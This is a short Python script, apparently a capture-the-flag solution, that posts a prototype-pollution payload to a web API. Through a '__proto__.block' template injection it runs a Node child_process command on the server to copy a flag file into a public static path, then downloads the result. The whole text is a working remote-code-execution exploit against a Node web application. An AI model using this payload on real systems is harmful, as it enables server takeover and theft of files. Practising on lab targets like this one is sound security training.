#!/usr/bin/python

import requests

ENDPOINT = 'http://167.99.202.131:31892/api/submit'

OUTPUT = 'http://167.99.202.131:31892/static/out'


request = requests.post(ENDPOINT, json = {

   "artist.name":"Gingell",

       "__proto__.block": {

           "type":"Text",

           "line":"process.mainModule.require('child_process').execSync('cat flagenZm2 > /app/static/out')"

       }

})


print (request.text)

print (requests.get(OUTPUT).text)
